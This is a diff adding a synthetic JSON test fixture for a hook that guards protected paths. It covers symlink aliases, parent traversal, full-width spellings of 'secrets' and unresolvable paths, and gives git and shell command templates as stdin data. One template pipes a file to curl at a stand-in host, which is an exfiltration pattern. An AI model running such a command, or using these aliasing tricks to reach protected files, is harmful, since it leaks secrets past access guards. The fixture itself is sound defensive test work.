@@ -1,0 +1,158 @@
+{
+  "notice": "CX-1106-3: synthetic fixture and numbered correspondence only. All paths are relative to a disposable owned root. Commands are Hook stdin DATA, never executed.",
+  "base": "bf78f62a033465b8824f9a1d0a8e1b963bacaa05",
+  "fixture": {
+    "prefix": "cx-1106-3-",
+    "groups": [
+      "protected",
+      "ordinary"
+    ],
+    "dirs": [
+      "protected/secrets/child",
+      "ordinary/public/child",
+      "work"
+    ],
+    "files": {
+      "protected/secrets/record.txt": "DUMMY",
+      "ordinary/public/record.txt": "DUMMY"
+    },
+    "links": {
+      "protected/bridge": "secrets",
+      "protected/pivot": "secrets/child",
+      "protected/pointer.txt": "secrets/record.txt",
+      "ordinary/bridge": "public",
+      "ordinary/pivot": "public/child",
+      "ordinary/pointer.txt": "public/record.txt"
+    },
+    "homes": [
+      "home"
+    ],
+    "blockedDir": "closed",
+    "loop": "cycle",
+    "missingParent": "absent",
+    "newLeaf": "future.txt",
+    "wireMarker": "native-attempts",
+    "preload": "no-native.cjs"
+  },
+  "commands": {
+    "write": "git update-index --add {operand}",
+    "cd": "cd {cwd} && {command}",
+    "read": "cat {operand}",
+    "outbound": "cat {operand} | curl -q https://example.invalid",
+    "path": [
+      "/usr/bin",
+      "/bin"
+    ],
+    "message": "git commit -F {operand}"
+  },
+  "cases": [
+    {
+      "id": "01",
+      "kind": "絶対",
+      "cwd": "{group}",
+      "operand": "{group}/bridge/record.txt",
+      "absolute": true,
+      "canonical": "{group}/{policy}/record.txt"
+    },
+    {
+      "id": "02",
+      "kind": "相対",
+      "cwd": "{group}/{policy}",
+      "operand": "record.txt",
+      "absolute": false,
+      "canonical": "{group}/{policy}/record.txt"
+    },
+    {
+      "id": "03",
+      "kind": "親辿り",
+      "cwd": "{group}",
+      "operand": "bridge/child/../record.txt",
+      "absolute": false,
+      "canonical": "{group}/{policy}/record.txt"
+    },
+    {
+      "id": "04",
+      "kind": "リンク経由",
+      "cwd": "{group}",
+      "operand": "bridge/record.txt",
+      "absolute": false,
+      "canonical": "{group}/{policy}/record.txt"
+    },
+    {
+      "id": "05",
+      "kind": "新規",
+      "cwd": "{group}/{policy}",
+      "operand": "future.txt",
+      "absolute": false,
+      "canonical": "{group}/{policy}/future.txt"
+    }
+  ],
+  "policies": {
+    "protected": "secrets",
+    "ordinary": "public"
+  },
+  "unknown": [
+    {
+      "id": "06",
+      "kind": "解決不能",
+      "cwd": "work",
+      "operand": "../cycle/record.txt"
+    },
+    {
+      "id": "07",
+      "kind": "権限不足",
+      "cwd": "work",
+      "operand": "../closed/record.txt"
+    },
+    {
+      "id": "08",
+      "kind": "親未確認",
+      "cwd": "work",
+      "operand": "../absent/record.txt"
+    }
+  ],
+  "mutation": "Disable only the new normalization branch; retain the pre-existing lexical inventory and every command/context guard.",
+  "notes": {
+    "01": "Absolute alias: compare its selected file to its canonical absolute spelling. The alias is also a link; types are not disjoint.",
+    "03": "Parent traversal starts from outside the protected directory and keeps the intermediate link semantics.",
+    "05": "The final entry is absent in both spellings."
+  },
+  "checks": [
+    {
+      "id": "09",
+      "kind": "確認中の差し替え",
+      "value": "metadata identity changes between observations"
+    },
+    {
+      "id": "10",
+      "kind": "cwd 未確認",
+      "value": null
+    },
+    {
+      "id": "11",
+      "kind": "操作の区別",
+      "cwd": "protected",
+      "operand": "pointer.txt",
+      "canonical": "protected/secrets/record.txt"
+    },
+    {
+      "id": "12",
+      "kind": "正規化補助",
+      "cwd": "work",
+      "operand": "../ｓｅｃｒｅｔｓ/record.txt",
+      "directory": "ｓｅｃｒｅｔｓ"
+    },
+    {
+      "id": "13",
+      "kind": "親辿りの操作差",
+      "cwd": "protected",
+      "operand": "pivot/../record.txt",
+      "canonical": "protected/secrets/record.txt"
+    },
+    {
+      "id": "14",
+      "kind": "公開 API 互換",
+      "values": "Canonical and operand values from the existing synthetic cases; legacy callback arguments are ignored."
+    }
+  ]
+}
